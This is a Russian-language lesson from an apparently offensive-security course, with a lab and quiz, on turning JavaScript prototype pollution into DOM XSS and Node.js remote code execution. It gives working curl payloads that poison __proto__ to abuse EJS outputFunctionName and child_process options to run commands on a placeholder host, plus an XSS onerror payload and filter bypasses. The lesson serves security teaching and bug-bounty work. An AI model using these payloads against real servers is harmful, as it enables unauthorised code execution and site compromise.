---
id: web-prototype-pollution-rce
title: "Prototype pollution → DOM XSS и server-side RCE"
category: web
parent: web-prototype-pollution
difficulty: hard
order: 1
tags: [prototype-pollution, xss, rce, gadget, nodejs, client-side]
prerequisites: [web-prototype-pollution, web-xss, web-command-injection]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
estimated_minutes: 45
summary: "Как из «просто отравленного» Object.prototype собрать цепочку до DOM XSS в браузере или RCE на Node.js."
lab:
  kind: shell
  title: "Практика: prototype pollution → RCE через гаджет EJS"
  toolset: [core, curl]
  workdir: /home/student/task
  files: [task.md]
  check: "grep -q 'nto{' found.txt"
  hints:
    - "Примитив не impact: сначала `{'__proto__':{'polluted':'yes'}}` в `/api/merge`, затем `/status`."
    - "Зависимости: `curl -s https://docs.example/package.json` — EJS 3.1.6 склонен к гаджету `outputFunctionName`."
    - "Загрязни `__proto__.outputFunctionName` строкой с внедрением кода через `/api/merge`."
    - "Триггер — рендер: `curl -s 'https://docs.example/render?page=about' > found.txt`, затем `check`."
---

## Вопрос, с которого всё начинается

На прошлом уроке мы отравили `Object.prototype` — записали туда своё свойство. Но само по себе это почти безвредно: свойство лежит и ничего не делает. Ценность появляется, когда кто-то его **прочитает** и использует небезопасно.

Вопрос: как из «просто отравленного прототипа» собрать цепочку до выполнения кода? Ответ — найти **гаджет**: место в коде, которое читает свойство из прототипа и передаёт его в опасный sink. Разберём это на одном примере.

## Наш пример

Есть Node-приложение `docs.example`, которое рендерит страницы через шаблонизатор EJS. Начнём с проверки, доходит ли загрязнение до сервера. Отправим JSON с ключом `__proto__`:

```bash
$ curl -s -X POST https://docs.example/api/merge \
  -H 'Content-Type: application/json' -d '{"__proto__":{"polluted":"yes"}}'
{"ok":true}
$ curl -s https://docs.example/status | grep polluted
"polluted":"yes"
```

Свойство появилось там, где мы его не задавали — примитив загрязнения подтверждён. Теперь ищем гаджет.

## Шаг 1: что такое гаджет

Гаджет — это код в приложении или библиотеке, который **читает свойство из прототипа** и использует его в опасном месте (sink). Классический паттерн на клиенте:

```js
const cfg = Object.assign({}, defaults, userInput);
element.innerHTML = cfg.html;   // sink
```

Если `defaults` не задаёт `html`, а мы загрязнили `Object.prototype.html`, то `cfg.html` «унаследуется» из прототипа и попадёт в `innerHTML`. Тогда:

```json
{"__proto__": {"html": "<img src=x onerror=alert(document.domain)>"}}
```

даёт **DOM-XSS**. Гаджет обычно живёт не в твоём коде, а в библиотеке — `lodash`, jQuery, шаблонизаторе. Поэтому искать надо именно там.

## Шаг 2: клиентские гаджеты → DOM-XSS

На клиенте цепочка короткая: свойство из прототипа → sink. Типовые гаджеты:

| Гаджет-свойство | Sink | Эффект |
|-----------------|------|--------|
| `src` / `href` | `<script src>` / `<a href>` | загрузка/переход |
| `innerHTML` | `element.innerHTML` | XSS |
| `srcdoc` | iframe | XSS |
| `template` | шаблонизатор | SSTI/XSS |
| `onload`/`onerror` | атрибут | XSS |

Загрязнить можно прямо через URL-фрагмент:

```
https://docs.example/#__proto__[src]=data:,alert(1)
```

Для поиска гаджетов в JS-бандле смотри места, где из «опций» берётся HTML или адрес:

```bash
$ curl -s https://docs.example/main.js -o main.js
$ grep -nE 'innerHTML|\.src *=|\.href *=|srcdoc' main.js | head
```

Затем проверь, читается ли управляющее свойство из прототипа. Инструмент **DOM Invader** (в Burp) делает это автоматически: он подставляет `__proto__` в источники и показывает, дошло ли значение до sink.

## Шаг 3: серверные гаджеты → RCE

На сервере (Node.js) гаджеты приводят к RCE. Самая известная цепочка — через `child_process`. Библиотека вызывает `execFile('ls', {shell: opts.shell})`, и если мы загрязнили `Object.prototype.shell`, `argv0` и `env`, команда исполнится:

```bash
$ curl -s -X POST https://docs.example/api/merge -H 'Content-Type: application/json' -d '{
    "__proto__":{"shell":"node","argv0":"console.log(require(\"child_process\").execSync(\"id\").toString())//"}}'
$ curl -s https://docs.example/api/export
uid=0(root) gid=0(root) groups=0(root)
```

Заметь: загрязнение само код не выполнило. Нужен **триггер** — участок, который вызывает `child_process` и полагается на свойства из прототипа (экспорт данных, конвертация, вызов внешней утилиты). Именно комбинация загрязнения и триггера даёт RCE.

## Шаг 4: гаджет в шаблонизаторе (EJS)

Второй классический серверный гаджет — шаблонизатор **EJS**. Он компилирует шаблон в функцию, и у него есть опция `outputFunctionName` — имя функции вывода. Загрязнив её, можно **внедрить свой код** в сгенерированную функцию:

```bash
$ curl -s -X POST https://docs.example/api/merge -H 'Content-Type: application/json' -d '{
    "__proto__":{"outputFunctionName":"x;process.mainModule.require(\"child_process\").execSync(\"id\").toString();s"}}'
```

Теперь любой вызов `ejs.render(template, data)` строит функцию с нашим `outputFunctionName` — и `id` исполняется:

```bash
$ curl -s 'https://docs.example/render?page=about'
uid=0(root) gid=0(root) groups=0(root)
```

У Pug похожий гаджет — опции `compileDebug`/`self`. Ключ к пониманию: библиотека читает опцию из прототипа и вставляет её в **исполняемый** контекст (команда, `eval`, шаблон).

## Шаг 5: как искать серверные гаджеты

```bash
# 1) находим зависимости
$ curl -s https://docs.example/package.json
$ npm ls ejs pug handlebars lodash
# 2) ищем опасные вызовы в node_modules
$ grep -rEn 'child_process|exec\(|spawn\(|fork\(' node_modules/ejs node_modules/pug | head
# 3) ppmap — автоматический поиск гаджетов
$ npx ppmap
```

Гаджет существует, если библиотека (а) читает свойство из прототипа и (б) использует его в исполняемом контексте. Самые «гаджетоносные» пакеты: `lodash`, `ejs`, `pug`, `handlebars`, `merge`, `deepmerge`, `hoek`. Известные CVE: CVE-2019-10744 (lodash), CVE-2021-23337 (lodash template), CVE-2019-7609 (Kibana).

## Шаг 6: обходы и тонкости

- **Не только `__proto__`.** Некоторые фильтры режут `__proto__`, но пропускают `constructor.prototype`.
- **Рекурсивная вложенность.** Защита, проверяющая только верхний уровень, обходится `a[__proto__][x]`.
- **Не только `Object.prototype`.** Иногда срабатывает загрязнение `Array.prototype` и `Function.prototype` — библиотеки читают и их.
- **Версии важны.** Гаджет в `lodash.merge` зависит от версии; сверяйся с известными CVE.
- **Безопасные команды.** На сервере `id`/`whoami` достаточно для доказательства — не выполняй разрушительных.

## Шаг 7: что доказывать

Примитив (`({}).polluted == '1'`) **не является** impact. Для отчёта нужна цепочка до sink:

1. запрос, который загрязняет прототип;
2. конкретный гаджет (библиотека + свойство);
3. триггер, который его активирует;
4. артефакт: `alert`/OOB-запрос (клиент) или вывод `id` (сервер).

Версии библиотек — ключ к пониманию, какая именно цепочка сработала; приложи их к отчёту.

## Шаг 8: почему это «двухшаговая» атака

Prototype pollution отличается от обычной инъекции тем, что состоит из **двух независимых шагов**, и оба нужно найти. Первый — источник: место, где пользовательские данные рекурсивно вливаются в объект (`merge`, `Object.assign`, `qs`-парсер). Второй — гаджет: код, который позже прочитает отравленное свойство. Между ними может пройти время: загрязнение в одном запросе «срабатывает» в другом, а на клиенте — вообще в другой части приложения.

Из этого следуют практические выводы. Во-первых, эффект бывает **отложенным** и «размазанным» — не ищи его в ответе на тот же запрос. Во-вторых, на сервере загрязнение живёт, пока живёт процесс Node: одно отравление `Object.prototype` влияет на **все последующие** запросы всех пользователей, что делает impact особенно высоким (и опасным для прода — не гоняй разрушительные команды). В-третьих, если приложение перезапускается между твоими запросами (например, в serverless), «отложенный» гаджет может не успеть сработать — тогда триггер нужно вызывать в том же процессе.

## Что мы теперь знаем

- Prototype pollution — **примитив**; impact появляется только в связке с гаджетом.
- Гаджет — код, читающий свойство из прототипа и использующий его в sink.
- На клиенте гаджеты дают DOM-XSS (`innerHTML`, `src`, `srcdoc`).
- На сервере — RCE через `child_process` (`shell`/`argv0`/`env`) и шаблонизаторы (EJS `outputFunctionName`).
- Нужен **триггер** — участок, вызывающий уязвимую библиотеку.
- Обходы: `constructor.prototype`, рекурсивная вложенность, `Array.prototype`.
- Артефакт — `alert` или вывод `id`, а не «загрязнено».

## На что смотреть дальше

- **Сначала подтверди примитив**, потом ищи гаджет — иначе бессмысленно.
- **Собери список зависимостей** и проверь самые «гаджетоносные» пакеты.
- **Помни про `constructor.prototype`** и рекурсивную вложенность — частые обходы.
- **Не пропускай клиентскую сторону** — там цепочка короче и часто даёт DOM-XSS.
- **Используй DOM Invader и ppmap** — они экономят часы ручного анализа бандла.
- **Только с согласия** — RCE-гаджет может уронить сервис.

## Квиз

Проверь себя.

```quiz
- question: "Чем prototype pollution становится опасным?"
  options:
    - "Само по себе оно критично"
    - "Когда отравленное свойство достигает sink (`innerHTML`/`child_process`)"
    - "Когда оно ускоряет сайт"
    - "Когда оно меняет DNS"
  answer: 1
  explanation: "Примитив + гаджет = XSS/RCE."
- question: "Какой ключ загрязняет прототип при рекурсивном merge?"
  options:
    - "`__proto__`"
    - "`content-length`"
    - "`accept`"
    - "`host`"
  answer: 0
  explanation: "`__proto__` (и `constructor.prototype`) указывают на прототип объекта."
- question: "Где на клиенте искать гаджет для PP→XSS?"
  options:
    - "В местах, где из опций берётся `innerHTML`/`src`/`href`"
    - "В CSS"
    - "В DNS"
    - "В cookie"
  answer: 0
  explanation: "Sink'и, читающие значения из прототипа, — цель для загрязнения."
- question: "Что из перечисленного — серверный гаджет?"
  options:
    - "`child_process.execFile` с опциями из прототипа"
    - "`innerHTML`"
    - "`document.cookie`"
    - "`localStorage`"
  answer: 0
  explanation: "Node-цепочки идут через `child_process`/`env`/`NODE_OPTIONS` и шаблонизаторы."
- question: "Достаточно ли доказательства `({}).polluted == '1'` для отчёта?"
  options:
    - "Да, это RCE"
    - "Нет, это только примитив — нужен sink и impact"
    - "Да, это XSS"
    - "Да, это SSRF"
  answer: 1
  explanation: "Загрязнение без sink не даёт утечки/исполнения."
```

## Куда дальше

Это последний урок ветки про обход XSS-защит. Дальше логично перейти к отдельной большой теме — **серверным инъекциям в SQL** (`web-sqli`), где мы разберём, как из «просто параметра» достать всю базу. А пока главное запомни: **prototype pollution — это примитив**, и его сила раскрывается только в связке с гаджетом.

## Где пригодится

- **CTF (Web):** задачи с JSON-merge и последующим XSS/RCE — классика.
- **Bug bounty:** PP→XSS в SPA и PP→RCE в Node-бэкендах — высокие выплаты.
- **Пентест:** анализ клиентских библиотек и Node-сервисов на гаджеты.
- **Работа (AppSec/Dev):** защита — `Object.create(null)`, `Object.freeze(Object.prototype)`, обновление lodash.
